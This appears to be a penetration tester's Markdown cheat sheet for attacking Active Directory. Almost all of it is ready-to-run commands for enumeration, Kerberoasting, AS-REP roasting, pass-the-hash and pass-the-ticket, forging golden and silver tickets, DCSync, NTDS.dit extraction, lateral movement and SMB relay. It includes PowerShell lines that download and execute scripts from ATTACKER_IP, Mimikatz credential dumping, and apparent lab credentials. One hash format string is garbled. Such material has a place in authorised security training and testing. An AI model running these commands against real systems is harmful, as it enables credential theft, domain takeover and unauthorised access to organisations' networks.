# Active Directory

## AD-Enumeration


## Domain Information

```powershell
# Get domain
echo %USERDOMAIN%
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Get domain controllers
nltest /dclist:DOMAIN
nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN.LOCAL

# Get domain SID
whoami /user
```

## User Enumeration

```powershell
# Current user
whoami /all

# All domain users
net user /domain
net user USERNAME /domain

# PowerShell
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter * | Select-Object Name,SamAccountName
```

## Group Enumeration

```powershell
# All groups
net group /domain

# Specific group members
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# PowerShell
Get-ADGroup -Filter * -Properties *
Get-ADGroupMember -Identity "Domain Admins"
```

## Computer Enumeration

```powershell
# All domain computers
net view /domain
nltest /dclist:DOMAIN

# PowerShell
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter * | Select-Object Name,DNSHostName,OperatingSystem
```

## NetExec (CrackMapExec)

```bash
# Check if SMB signing required
netexec smb TARGET

# Null session enumeration
netexec smb TARGET -u '' -p ''
netexec smb TARGET -u 'guest' -p ''

# Enumerate shares
netexec smb TARGET -u 'user' -p 'password' --shares

# Enumerate users
netexec smb TARGET -u 'user' -p 'password' --users

# Enumerate groups
netexec smb TARGET -u 'user' -p 'password' --groups

# Enumerate logged on users
netexec smb TARGET -u 'user' -p 'password' --loggedon-users

# Check if user is admin (look for Pwn3d!)
netexec smb TARGET -u 'user' -p 'password'

# Password policy
netexec smb TARGET -u 'user' -p 'password' --pass-pol

# Spider shares
netexec smb TARGET -u 'user' -p 'password' -M spider_plus
```

## LDAP Enumeration

```bash
# Enumerate domain users without credentials
netexec ldap DC_IP -u '' -p '' --users

# With credentials
netexec ldap DC_IP -u 'user' -p 'password' --users
netexec ldap DC_IP -u 'user' -p 'password' --groups
```

## BloodHound


## SharpHound (Windows)

```powershell
# Download
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/SharpHound.ps1')

# Collect all data
Invoke-BloodHound -CollectionMethod All -Domain DOMAIN.LOCAL -ZipFileName output.zip

# Or use exe
.\SharpHound.exe -c All -d DOMAIN.LOCAL

# Specific collection methods
.\SharpHound.exe -c Session,Group,LocalAdmin
```

## bloodhound-python (Linux)

```bash
# Basic collection
bloodhound-python -u 'user' -p 'password' -d DOMAIN.LOCAL -ns DC_IP -c All

# With Kerberos
bloodhound-python -u 'user' -k -d DOMAIN.LOCAL -ns DC_IP -c All

# Save to specific directory
bloodhound-python -u 'user' -p 'password' -d DOMAIN.LOCAL -ns DC_IP -c All --zip
```

## Useful Queries

Pre-built queries in BloodHound GUI:
- Find all Domain Admins
- Find Shortest Paths to Domain Admins
- Find Principals with DCSync Rights
- Shortest Paths to High Value Targets
- Find AS-REP Roastable Users (DontReqPreAuth)
- Find Kerberoastable Users
- Find Computers with Unsupported Operating Systems

## Kerberoasting


## What is Kerberoasting?

Attack to crack service account passwords by requesting TGS tickets for SPNs

## Find Kerberoastable Accounts

```powershell
# PowerShell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Impacket
impacket-GetUserSPNs DOMAIN/user:password -dc-ip DC_IP

#nxc 
nxc ldap 10.10.71.146 -u "Eric.Wallows" -p "EricLikesRunning800" --kerberoasting kerb.txt

```

## Request TGS Tickets

```powershell
# PowerShell (Invoke-Kerberoast)
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -OutputFormat Hashcat | fl

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt
.\Rubeus.exe kerberoast /user:SERVICE_ACCOUNT /outfile:hash.txt

# Impacket (from Linux)
impacket-GetUserSPNs DOMAIN/user:password -dc-ip DC_IP -request
impacket-GetUserSPNs DOMAIN/user:password -dc-ip DC_IP -request-user SERVICE_ACCOUNT
```

## Crack TGS Tickets

```bash
# Hashcat
hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# John
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

## ASREPRoasting


## What is AS-REP Roasting?

Attack against accounts with "Do not require Kerberos preauthentication" enabled

## Find AS-REP Roastable Accounts

```powershell
# PowerShell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# Impacket
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt -format hashcat
```

## Request AS-REP

```powershell
# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Impacket (no credentials needed)
impacket-GetNPUsers DOMAIN/user -no-pass -dc-ip DC_IP
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile hashes.txt
```

## Crack AS-REP Hashes

```bash
# Hashcat
hashcat -m 18200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# John
john --format=krb5xxxxxxxxxxasrep --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

## Pass-the-Hash


## What is Pass-the-Hash?

Use NTLM hash instead of password for authentication

## Obtain NTLM Hash

```powershell
# Mimikatz
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords

# Or from SAM
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

## Pass-the-Hash Attacks

```bash
# Impacket psexec
impacket-psexec -hashes :NTLM_HASH administrator@TARGET

# Impacket wmiexec
impacket-wmiexec -hashes :NTLM_HASH administrator@TARGET

# Impacket smbexec
impacket-smbexec -hashes :NTLM_HASH administrator@TARGET

# Evil-WinRM
evil-winrm -i TARGET -u administrator -H NTLM_HASH

# NetExec
netexec smb TARGET -u administrator -H NTLM_HASH -x "whoami"

# Mimikatz (from Windows)
mimikatz# sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:HASH /run:powershell.exe
```

## Pass-the-Ticket


## Export Tickets

```powershell
# Mimikatz - Export all tickets
mimikatz# sekurlsa::tickets /export

# Rubeus - Export specific ticket
.\Rubeus.exe dump /luid:0x123456 /nowrap
```

## Import and Use Tickets

```powershell
# Mimikatz
mimikatz# kerberos::ptt ticket.kirbi

# Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Verify
klist

# Access resource
dir \\DC\C$
```

## Impacket (Linux)

```bash
# Convert .kirbi to .ccache
impacket-ticketConverter ticket.kirbi ticket.ccache

# Use ticket
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass DOMAIN/user@TARGET
```

## Golden-Silver-Tickets


## Golden Ticket

### What is it?
Forged TGT with KRBTGT hash, grants access to any resource in domain

### Requirements
- KRBTGT hash
- Domain SID
- Domain name

### Obtain KRBTGT Hash

```powershell
# Mimikatz (requires DA or DC access)
mimikatz# privilege::debug
mimikatz# lsadump::lsa /patch

# Or DCSync
mimikatz# lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt

# Impacket
impacket-secretsdump DOMAIN/administrator@DC_IP
```

### Get Domain SID

```powershell
# PowerShell
whoami /user

# Or
Get-ADDomain | Select-Object DomainSID
```

### Create Golden Ticket

```powershell
# Mimikatz
mimikatz# kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /krbtgt:HASH /id:500 /ptt

# Parameters:
# /user - Username to impersonate
# /domain - Domain FQDN
# /sid - Domain SID
# /krbtgt - KRBTGT hash
# /id - User RID (500 for Administrator)
# /ptt - Inject ticket into memory

# Impacket (Linux)
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain DOMAIN.LOCAL administrator

# Use ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass DOMAIN/administrator@DC
```

---

## Silver Ticket

### What is it?
Forged TGS for specific service using service account hash

### Create Silver Ticket

```powershell
# Mimikatz
mimikatz# kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /target:TARGET.DOMAIN.LOCAL /service:cifs /rc4:SERVICE_HASH /ptt

# Common services:
# cifs - File sharing
# http - Web services
# mssql - SQL Server
# ldap - LDAP
```

## DCSync


## What is DCSync?

Abuse replication rights to dump password hashes from DC

## Requirements

- Replication rights (Domain Admin, Enterprise Admin, or specific rights)
- Needs: "Replicating Directory Changes" and "Replicating Directory Changes All"

## Perform DCSync

```powershell
# Mimikatz - Dump single user
mimikatz# lsadump::dcsync /domain:DOMAIN.LOCAL /user:administrator

# Dump all users
mimikatz# lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv

# Impacket
impacket-secretsdump DOMAIN/user:password@DC_IP
impacket-secretsdump -just-dc-user administrator DOMAIN/user:password@DC_IP
```

## NTDS.dit Extraction

```powershell
# Shadow copy method
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# Extract hashes
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Or use DCSync (better)
impacket-secretsdump DOMAIN/user:password@DC_IP -just-dc
```

## Lateral-Movement


## PSExec

```bash
# Impacket
impacket-psexec DOMAIN/user:password@TARGET
impacket-psexec -hashes :NTLM_HASH DOMAIN/user@TARGET

# Sysinternals PSExec
.\PsExec.exe \\TARGET -u DOMAIN\user -p password cmd
```

## WMI

```bash
# wmiexec
impacket-wmiexec DOMAIN/user:password@TARGET
impacket-wmiexec -hashes :NTLM_HASH DOMAIN/user@TARGET

# PowerShell
$username = 'DOMAIN\user'
$password = 'password'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Invoke-WmiMethod -ComputerName TARGET -Credential $credential -Class Win32_Process -Name Create -ArgumentList "powershell.exe"
```

## WinRM / Evil-WinRM

```bash
# Evil-WinRM
evil-winrm -i TARGET -u user -p password
evil-winrm -i TARGET -u user -H NTLM_HASH

# PowerShell
Enter-PSSession -ComputerName TARGET -Credential DOMAIN\user
```

## RDP

```bash
# xfreerdp
xfreerdp /u:administrator /p:password /v:TARGET
xfreerdp /u:administrator /pth:NTLM_HASH /v:TARGET

# rdesktop
rdesktop -u administrator -p password TARGET
```

## SMB Relay

```bash
# Responder + ntlmrelayx
# Terminal 1: Responder
sudo responder -I eth0 -dwP

# Terminal 2: ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Or with command execution
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

